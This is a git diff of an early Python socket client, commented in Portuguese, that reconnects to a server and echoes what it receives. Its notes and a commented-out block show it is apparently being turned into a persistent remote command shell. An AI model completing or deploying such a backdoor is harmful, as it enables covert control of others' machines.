@@ -7,9 +7,12 @@
 # se cair -> reconecta
 # ao reiniciar o pc -> reconecta
 
+# comando[0] == 'cd' -> os.chdir()
+
 import socket
 import os
 import time
+import subprocess
 
 def conecta(IP, PORT):
     try:
@@ -26,7 +29,7 @@ def executa(socket):
             dados = socket.recv(1024)
             if(not dados): # servidor desconectou, recomeça
                 return
-            print(dados)
+            print(dados)    # CRIAR THREADS PARA RODAR PROGRAMAS -> NÃO TER QUE ESPERAR O PROGRAMA FECHAR
             socket.send(dados)
         except: # algum erro ocorreu, recomeça
             return
@@ -39,8 +42,7 @@ def executa(socket):
             print(e)
             conexao.send(str(e))
     '''
-
-if __name__=='__main__':
+def main():
     ip='127.0.0.1'
     porta=1025
     while True:
@@ -49,3 +51,6 @@ if __name__=='__main__':
             executa(conexao)
         else:
             time.sleep(10)
+
+if __name__=='__main__':
+    main()
